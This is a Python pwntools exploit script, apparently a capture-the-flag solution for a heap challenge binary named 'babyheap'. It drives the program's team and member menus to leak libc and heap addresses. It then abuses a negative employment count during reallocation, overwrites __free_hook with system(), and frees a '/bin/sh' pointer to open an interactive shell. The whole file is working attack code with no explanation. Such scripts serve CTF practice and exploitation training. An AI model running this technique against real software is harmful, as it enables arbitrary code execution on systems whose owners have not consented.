from pwn import *

context.log_level='debug'

#libc_leak=create_team -> manage_team -> add_member 2 -> delete_member 0 

e=ELF('./babyheap')
l=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Create_Team(desc_len, desc):
	print s.recvuntil('>')
	s.sendline('1')
	print s.recvuntil('Description length :')
	s.sendline(str(desc_len))
	print s.recvuntil('Description :')
	s.send(desc)
	
def Delete_Team(index):
        print s.recvuntil('>')
        s.sendline('2')
	print s.recvuntil('Index :')
	s.sendline(str(index))

def Manager_Team(index):
        print s.recvuntil('>')
        s.sendline('3')
        print s.recvuntil('Index :')
        s.sendline(str(index))

def List_Team(until):
	print s.recvuntil('>')
	s.sendline('4')
	print s.recvuntil(until)
 
def Add_Member(num_employment, name, desc, check):

	if check == 'TRUE':
		print s.recvuntil('>')
		s.sendline('1')
		print s.recvuntil('Number of employment :')
		s.sendline(str(num_employment))
	
	print s.recvuntil('Name :') #100 len
	s.send(name)
	print s.recvuntil('Description :') #100 len
	s.send(desc)

def Delete_Member(index):
	print s.recvuntil('>')
	s.sendline('2')
	print s.recvuntil('Index :')
	s.sendline(str(index))

def List_Member(until):
	print s.recvuntil('>')
	s.sendline('3')
	print s.recvuntil(until)
	
def Manager_Member(index, desc):
	print s.recvuntil('>')
	s.sendline('4')
	print s.recvuntil('Index :')
	s.sendline(str(index))
	print s.recvuntil('Description :') #100 len
	s.send(desc)

def Return():
	print s.recvuntil('>')
	s.sendline('5')
	print s.recvuntil('1. Create Team')

if __name__ == "__main__":
	
	s=process('./babyheap')

	Create_Team(100,'A'*100) #team 0
	Manager_Team(0)
	Add_Member(2,'B'*100,'b'*100,'TRUE')
	Add_Member('','C'*100,'c'*100,'Not')
	
	Delete_Member(0)

	Add_Member('1','D'*100,'d'*8,'TRUE')
	List_Member('d'*8)
	libc_leak=u64(s.recv(8))-0x2e31000000000000
	
	Return()

	Delete_Team(0)
	
	Create_Team(0x18,'!'*16) #team 0
	List_Team('!'*0x10)

	heap_leak=u64(s.recv(8))-0x6953000000000000

	Create_Team(0x18,'B'*0x18) #team 1 
	Manager_Team(1)
	
        Add_Member(2,'D'*100,'d'*100,'TRUE')
	Add_Member('','F'*100,'f'*100,'Not')

	Delete_Member(0)

	Return()

	Create_Team(0x18,'A'*0x18) #team2
	Delete_Team(2)
	Create_Team(0x18,'B'*0x18) #team2
	Create_Team(0x18,'C'*0x18) #team3

	Manager_Team(2)
	Add_Member(2,'R'*100,'r'*100,'TRUE')
	Add_Member('','Q'*100,'Q'*100,'Not')

	#Move realloc chunk
	print s.recvuntil('>')
	s.sendline('1')
	print s.recvuntil('Number of employment :')
	s.sendline('-2')


	print "**************************************************"
	print '[*]libc_leak: '+str(hex(libc_leak))
	print '[*]heap_leak: '+str(hex(heap_leak))
	
	libc_base=libc_leak-0x3c4b78
	heap_base=heap_leak-0xa0
	system_libc=libc_base+l.symbols['system']
	__free_hook=libc_base+l.symbols['__free_hook']

	binsh=libc_base+list(l.search('/bin/sh\x00'))[0]

	print '[*]libc_base: '+str(hex(libc_base))
	print '[*]heap_leak: '+str(hex(heap_base))
	print '[*]system_libc: '+str(hex(system_libc))
	print '[*]_free_hook: '+str(hex(__free_hook))
	print '[*]"/bin/sh": '+str(hex(binsh))
	print "**************************************************"		

	Return()
	Create_Team(0x20,p64(__free_hook)+p64(binsh))
	
	Manager_Team(2)
	Manager_Member(0,p64(system_libc))

	Delete_Member(1)

	s.interactive()

